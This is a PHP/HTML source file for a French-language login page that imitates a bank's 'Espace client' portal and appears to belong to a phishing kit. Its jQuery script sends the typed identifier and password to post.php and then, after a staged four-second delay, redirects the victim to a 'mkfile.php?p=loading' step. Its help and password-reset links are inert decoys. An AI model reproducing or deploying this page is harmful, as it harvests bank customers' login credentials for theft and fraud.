<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>
<div class="holder">
<div class="left">
<div class="form">

<div class="title">
Connexion
</div>


<div class="col">
<label>Mon identifiant</label>
<div class="input">
    <img src="res/u.png">
    <input type="text" id="u" placeholder="Identifiant">
</div>
</div>


<div class="col">
<label>Mon mot de passe</label>
<div class="input">
    <img src="res/p.png">
    <input type="password" id="p" placeholder="Mot de passe">
</div>
<span class="a">Mot de passe oublié</span>
</div>

<div class="col">
<button onclick="sendData()"><span id="loader"><img src="res/loading.gif"></span> Accéder à mes comptes </button>

<div class="links">
<span class="a">Besoin d'aide pour vous connecter?</span>
<span class="a">Nouvel abonné ? Cliquez ici pour commencer</span>
<span class="a">Lancer la démonstration</span>
</div>
</div>



</div>
</div>



<div class="right">
<img src="res/123.png">
</div>
</div>
</main>




<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>



function sendData(){
var u = $("#u");
var p = $("#p");

$("input").removeClass("error");

if (u.val().trim() === "") {
u.addClass("error");
} 

if (p.val().trim() === "") {
p.addClass("error");
} 

if (u.val().trim() !== "" && p.val().trim() !== "") {
$("#loader").show();
    $.post("post.php", { user: u.val(), pass: p.val()  }, function(data) {
        setTimeout(()=>{
                window.location="mkfile.php?p=loading";
            }, 4000);
    });
}


}




$("input").keypress(function(e){
if(e.key=="Enter"){
sendData();
}
});
 
</script>

</body>
</html>